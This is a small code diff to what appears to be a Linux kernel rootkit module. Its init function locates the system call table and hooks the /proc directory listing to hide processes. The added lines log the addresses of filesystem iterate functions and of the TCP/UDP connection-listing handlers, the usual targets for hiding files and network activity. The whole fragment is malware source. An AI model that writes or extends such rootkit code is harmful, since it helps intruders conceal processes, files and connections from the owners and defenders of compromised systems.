@@ -1031,6 +1031,13 @@ static int __init i_solemnly_swear_that_i_am_up_to_no_good ( void )
     sys_call_table = find_sys_call_table();
 
     DEBUG("sys_call_table obtained at %p\n", sys_call_table);
+    DEBUG("proc_iterate at %p\n", get_vfs_iterate("/proc"));
+    DEBUG("root_iterate at %p\n", get_vfs_iterate("/"));
+    DEBUG("data1_iterate at %p\n", get_vfs_iterate("/data1"));
+    DEBUG("tcp4_seq_show at %p\n", get_tcp_seq_show("/proc/net/tcp"));
+    DEBUG("tcp6_seq_show at %p\n", get_tcp_seq_show("/proc/net/tcp6"));
+    DEBUG("udp4_seq_show at %p\n", get_udp_seq_show("/proc/net/udp"));
+    DEBUG("udp6_seq_show at %p\n", get_udp_seq_show("/proc/net/udp6"));
 
     /* Hook /proc for hiding processes */
     proc_iterate = get_vfs_iterate("/proc");
